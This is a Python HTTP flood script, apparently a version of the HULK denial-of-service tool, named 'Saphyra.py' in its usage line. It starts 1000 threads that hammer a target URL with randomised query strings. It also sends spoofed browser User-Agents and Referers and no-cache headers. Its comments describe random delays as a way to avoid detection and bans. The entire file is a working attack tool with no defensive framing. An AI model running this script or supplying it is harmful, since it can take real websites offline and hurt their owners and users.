import urllib.request
import sys
import threading
import random
import re
import time  # Added for delay handling

# Global variables
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0
port = 80  # Default port

def inc_counter():
    global request_counter
    request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

def useragent_list():
    global headers_useragents
    headers_useragents = [
        'Mozilla/5.0 (X11; Linux x86_64) Gecko/20090913 Firefox/3.5.3',
        'Mozilla/5.0 (Windows NT 6.1) Gecko/20090824 Firefox/3.5.3',
        'Mozilla/5.0 (Windows NT 5.2) Gecko/20090824 Firefox/3.5.3',
        'Mozilla/5.0 (Windows NT 6.1) Gecko/20090718 Firefox/3.5.1',
        'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/532.1 Chrome/4.0.219.6 Safari/532.1',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)',
        'Opera/9.80 (Windows NT 5.2) Presto/2.5.22 Version/10.51'
    ]
    return headers_useragents

def referer_list():
    global headers_referers
    headers_referers = [
        'http://www.google.com/?q=',
        'http://www.usatoday.com/search/results?q=',
        'http://engadget.search.aol.com/search?q=',
        'http://' + host + '/'
    ]
    return headers_referers

def buildblock(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

def usage():
    print("Usage: python Saphyra.py <url> <port>")
    sys.exit()

def httpcall(url):
    useragent_list()
    referer_list()
    param_joiner = '&' if '?' in url else '?'
    request_url = url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
    
    request = urllib.request.Request(request_url)
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host', host)
    
    try:
        response = urllib.request.urlopen(request)
        inc_counter()
        time.sleep(random.uniform(0, 1))  # Added random delay to avoid detection
    except urllib.error.HTTPError as e:
        if e.code == 429:
            print("Too Many Requests - Adding a delay...")
            time.sleep(random.uniform(2, 5))  # Added longer wait to prevent bans
        else:
            set_flag(1)
            print(f"Server error {e.code}")
    except urllib.error.URLError:
        sys.exit("Connection failed!")

def validate_url(target_url):
    if not re.match(r'^https?://', target_url):
        print("Invalid URL format. Use http:// or https://")
        sys.exit()

def get_host_from_url(target_url):
    match = re.search(r'http[s]?://([^/:]*)', target_url)
    return match.group(1) if match else None

class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                httpcall(url)
        except Exception as ex:
            print(f"Thread error: {ex}")

class MonitorThread(threading.Thread):
    def run(self):
        global request_counter
        previous = request_counter
        while flag == 0:
            if previous + 100 < request_counter:
                print(f"{request_counter} requests sent")
                previous = request_counter
        if flag == 2:
            print("Attack finished!")

if len(sys.argv) < 2:
    usage()
else:
    url = sys.argv[1]
    validate_url(url)
    
    if len(sys.argv) >= 3:
        try:
            port = int(sys.argv[2])
        except ValueError:
            print("Invalid port number, defaulting to 80")
            port = 80
    
    host = get_host_from_url(url)
    
    print(f"Flooding {host} on port {port} with HTTP requests...")
    threads = [HTTPThread() for _ in range(1000)]
    
    try:
        for thread in threads:
            thread.start()
        
        monitor = MonitorThread()
        monitor.start()
        
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("\nAttack stopped manually.")
        sys.exit()
